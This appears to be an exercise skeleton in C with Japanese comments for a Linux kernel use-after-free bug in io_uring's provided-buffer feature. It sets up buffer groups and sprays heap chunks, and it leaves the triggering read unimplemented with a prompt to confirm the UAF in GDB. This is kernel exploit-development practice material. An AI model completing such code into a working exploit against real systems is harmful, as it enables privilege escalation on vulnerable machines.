#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <liburing.h>
#include <linux/types.h>
#include <linux/xattr.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define UNIMPLEMENTED() assert(0 && "unimplemented")
#define ulong unsigned long

/**
 * /proc/self/mapsを開く
 *
 * @return int /proc/self/mapsのfd
 */
int open_maps(void) {
  int fd = open("/proc/self/maps", O_RDONLY);
  assert(fd >= 2);
  return fd;
}

/**
 * @brief io_uringをセットアップする
 *
 * @param ring io_uring
 */
void init_uring(struct io_uring *ring) { io_uring_queue_init(0x100, ring, 0); }

/**
 * @brief Buffer Group を使ってreadする
 *
 * @param ring io_uring
 * @param fd readしたいファイルのfd
 * @param size readするサイズ
 * @param offset readするオフセット
 * @param bgid Buffer Group の BGID(Buffer Group ID)
 */
void ring_submit_read(struct io_uring *ring, int fd, size_t size, ulong offset,
                      int bgid) {
  struct io_uring_sqe *sqe = NULL;

  // 利用可能なSQEを取得する
  sqe = io_uring_get_sqe(ring);
  // SQEにリクエストを詰める
  io_uring_prep_read(sqe, fd, NULL, size, offset);
  // Buffer Groupを使うようにフラグを設定
  io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
  // BGIDを設定 (struct io_uring_sqeの定義を参考)
  sqe->buf_group = bgid;
  // kernelに通知する
  io_uring_submit(ring);
}

/**
 * @brief Buffer Groupをkernelと共有する
 *
 * @param ring io_uring
 * @param buf_addr 共有したいバッファの先頭アドレス
 * @param len 共有したいバッファの1つ分のサイズ
 * @param num 共有したいバッファの数
 * @param bgid 共有したい Buffer Group の Group ID
 * @param bid_start 共有したい Buffer Group の Buffer ID の開始番号
 */
void ring_submit_buffer(struct io_uring *ring, char *buf_addr, int len, int num,
                        int bgid, int bid_start) {
  struct io_uring_sqe *sqe = NULL;
  struct io_uring_cqe *cqe = NULL;

  // 利用可能なSQEを取得する
  sqe = io_uring_get_sqe(ring);
  // SQEにリクエストを詰める
  io_uring_prep_provide_buffers(sqe, buf_addr, len, num, bgid, bid_start);
  // kernelに通知する
  assert(io_uring_submit(ring) >= 0);

  // CQEのレスポンスを待つ
  io_uring_wait_cqe(ring, &cqe);
  io_uring_cqe_seen(ring, cqe);
}

/**
 * @brief CQにレスポンスが返ってくるまで待つ
 *
 * @return int CQEのres (使われたバッファのBID)
 *
 * @param ring io_uring
 */
void ring_wait_cqe(struct io_uring *ring) {
  struct io_uring_cqe *cqe = NULL;

  // レスポンスが返ってきたCQEを取得する
  io_uring_wait_cqe(ring, &cqe);
  assert(cqe->res >= 0);
  io_uring_cqe_seen(ring, cqe);
}

/**
 * heapにダミーのchunkを確保する。
 * ダミー用。
 */
void allocate_dummy_chunk(void) { open("/proc/self/stat", O_RDONLY); }

int main(void) {
#define BUF_SIZE 0x50
  char buf[BUF_SIZE * 3] = {0};
  struct io_uring ring;
  int fd = open_maps();

  // ringの初期化
  init_uring(&ring);

  // Buffer Group を共有する
  ring_submit_buffer(&ring, buf, BUF_SIZE, 3, 0, 0);

  // debug: dummy chunkを確保しておく
  for (int ix = 0; ix != 0x10; ++ix) allocate_dummy_chunk();

  // Buffer Group を使って1つだけreadする
  // UAFで io_buffer の直後のオブジェクトがfreeされるようにサイズを調節
  UNIMPLEMENTED();
  ring_wait_cqe(&ring);

  // PRACTICE: GDBでUAFが発生していることを確認する
  puts("[+] Waiting for GDB...");
  sleep(99999);

  return 0;
}
